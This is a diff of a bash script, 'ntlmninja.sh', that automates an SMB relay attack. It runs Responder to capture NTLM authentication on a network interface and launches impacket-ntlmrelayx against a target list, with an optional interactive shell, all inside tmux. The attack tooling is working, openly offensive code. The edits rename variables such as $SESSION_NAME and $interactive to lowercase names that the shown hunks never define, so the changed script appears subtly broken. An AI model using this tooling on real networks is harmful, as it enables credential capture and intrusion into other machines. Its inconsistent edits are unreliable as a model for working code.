@@ -1,5 +1,4 @@
 #!/bin/bash
-set -euo pipefail
 
 # =============================================================
 # ntlmninja.sh - SMB Relay Attack Automation Script
@@ -13,6 +12,8 @@ set -euo pipefail
 SESSION_NAME="smb_relay_attack"
 TARGET_SMB_FILE="vulnerable_smb_targets.txt"
 RESPONDER_CONFIG_FILE="/etc/responder/Responder.conf"
+interactive=false
+network_interface="auto"
 
 # Define color codes
 RED='\033[0;31m'
@@ -21,9 +22,6 @@ YELLOW='\033[0;33m'
 BLUE='\033[0;34m'
 CYAN='\033[0;36m'
 RESET='\033[0m'
-
-interactive=false
-network_interface="auto"
 
 # Network interface (dynamically detected by default)
 detect_network_interface() {
@@ -34,7 +32,7 @@ detect_network_interface() {
 print_help() {
     echo -e "${BLUE}Usage: $0 -f TARGET_FILE [-i NETWORK_INTERFACE] [-x] [-h]${RESET}"
     echo -e "  ${YELLOW}-f TARGET_FILE${RESET}         (Required) File containing target IPs to scan for misconfigured SMB signing."
-    echo -e "  ${YELLOW}-i NETWORK_INTERFACE${RESET}   (Optional) Specify network interface (default: auto-detected)."
+    echo -e "  ${YELLOW}-i NETWORK_INTERFACE${RESET}   (Optional) Specify network interface (default: ${network_interface})."
     echo -e "  ${YELLOW}-x${RESET}                     (Optional) Enable interactive shell in ntlmrelayx."
     echo -e "  ${YELLOW}-h${RESET}                     Display this help and exit."
 }
@@ -162,14 +160,14 @@ run_smb_relay_attack() {
     echo -e "${BLUE}[*] Starting SMB Relay Attack...${RESET}" | tee -a attack.log
 
     # Ensure tmux session exists
-    if ! tmux has-session -t "$SESSION_NAME" 2>/dev/null; then
-        echo -e "${GREEN}[+] Creating tmux session: $SESSION_NAME.${RESET}"
-        tmux new-session -d -s "$SESSION_NAME"
+    if ! tmux has-session -t "$session_name" 2>/dev/null; then
+        echo -e "${GREEN}[+] Creating tmux session: $session_name.${RESET}"
+        tmux new-session -d -s "$session_name"
     fi
 
     # Start Responder in a tmux window
     echo -e "${CYAN}Starting Responder on interface $network_interface...${RESET}"
-    start_tmux_window "$SESSION_NAME" "responder" "responder -I $network_interface 2>&1 | tee -a responder_$(date +%s).log" || {
+    start_tmux_window "$session_name" "responder" "responder -I $network_interface 2>&1 | tee -a responder_$(date +%s).log" || {
         echo -e "${RED}Failed to start Responder.${RESET}"
         exit 1
     }
@@ -178,18 +176,18 @@ run_smb_relay_attack() {
     echo -e "${CYAN}Starting impacket-ntlmrelayx with target file ${TARGET_SMB_FILE}...${RESET}"
 
     relay_command="impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE} 2>&1 | tee -a relay_$(date +%s).log"
-    if [ "$interactive" = true ]; then
+    if [ "$enable_interactive" = true ]; then
         echo -e "${YELLOW}[+] Enabling interactive shell (--interactive) in ntlmrelayx.${RESET}"
         relay_command+=" --interactive"
     fi
     
-    start_tmux_window "$SESSION_NAME" "ntlmrelayx" "$relay_command" || {
+    start_tmux_window "$session_name" "ntlmrelayx" "$relay_command" || {
         echo -e "${RED}Failed to start ntlmrelayx.${RESET}"
         exit 1
     }
 
     # Attach to the tmux session
-    tmux -CC attach-session -t "$SESSION_NAME"
+    tmux -CC attach-session -t "$session_name"
 }
 
 parse_args() {
@@ -220,6 +218,10 @@ validate() {
     validate_network_interface
 }
 
+
+
+# Show the banner
+banner
 
 # Start SMB Relay Attack
 check_tmux_session() {
